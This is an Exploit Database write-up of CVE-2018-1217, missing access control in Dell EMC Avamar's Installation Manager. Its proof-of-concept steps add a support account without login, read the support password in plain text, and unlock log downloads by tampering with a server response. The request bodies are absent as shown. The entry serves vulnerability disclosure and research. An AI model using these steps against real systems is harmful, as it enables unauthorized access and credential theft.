# Tested on: [Dell EMC Avamar Virtual Edition version 7.5.0.183]
# CVE : [CVE-2018-1217]

==================
#Product:-
==================
EMC Avamar Virtual Edition is great for enterprise backup data protection for small and medium sized offices. EMC Avamar Virtual Edition is optimized for backup and recovery of virtual and physical servers,enterprise applications,remote offices,and desktops or laptops.

==================
#Vulnerability:-
==================
Dell EMC Avamar and Integrated Data Protection Appliance Installation Manager Missing Access Control Vulnerability (DSA-2018-025)

========================
#Vulnerability Details:-
========================

=====================================================================================================================================================
1. Missing functional level access control allows an unauthenticated user to add DELL EMC Support Account to the Installation Manager (CVE-2018-1217)
=====================================================================================================================================================

DELL EMC Avamar fails to restrict access to Configuration section that let Administrators set up Installation Manager configurations, or check for new packages from the Online Support site. An unauthenticated, remote attacker could add an Online Support Account for DELL EMC without any user interaction.

#Proof-Of-Concept:
------------------
1. Send following request to the target:

POST /avi/avigui/avigwt HTTP/1.1

2. Log into Avamar Installation Manager and navigate to Configuration tab to make sure that the user 'hacker' was added successfully.

=========================================================================================================================================================
2. Missing functional level access control allows an unauthenticated user to retrieve DELL EMC Support Account Credentials in Plain Text (CVE-2018-1217)
=========================================================================================================================================================

DELL EMC Avamar fails to restrict access to Configuration section that let Administrators set up Installation Manager configurations, or check for new packages from the Online Support site. An unauthenticated, remote attacker could retrieve Online Support Account password in plain text.

#Proof-Of-Concept:
------------------
1. Send following request to the target:

POST /avi/avigui/avigwt HTTP/1.1
Host: <target_ip>
Connection: Keep-Alive
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0

2. Server returns credentials in plain text:

=========================================================================================================================================================
3. Improper validation of ëDELL EMC Customer Support passcodeí allows an authenticated user to unlock DELL EMC Support Account and download verbose logs
=========================================================================================================================================================

DELL EMC Avamar fails to validate ëDELL EMC Customer Support passcodeí properly allowing an authenticated user to unlock the support account and view/download verbose logs. However, according to vendor, this one seems to be a vulnerability but it's an ambuious functionality instead.

#Proof-Of-Concept:
------------------
1. Try to unlock the support account with an invalid password and you get error 'Customer Support Access Denied':
2. Now send the same request again (with invalid password) and tamper the server response:

Request:
---------
POST /avi/avigui/avigwt HTTP/1.1

Tampered response:
--------------------
HTTP/1.1 200 OK
Date: Fri, 24Nov 2017 07:57:25 GMT
Server: Jetty(9.0.6.v20130930)
X-Frame-Options: SAMEORIGIN
Content-Type: application/json; charset=utf-8
Content-Disposition: attachment
Content-Length: 21
Connection: close

//OK[1,["true"],0,7]

3. This unlocks the support account and enabled the 'Log' download button.

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.
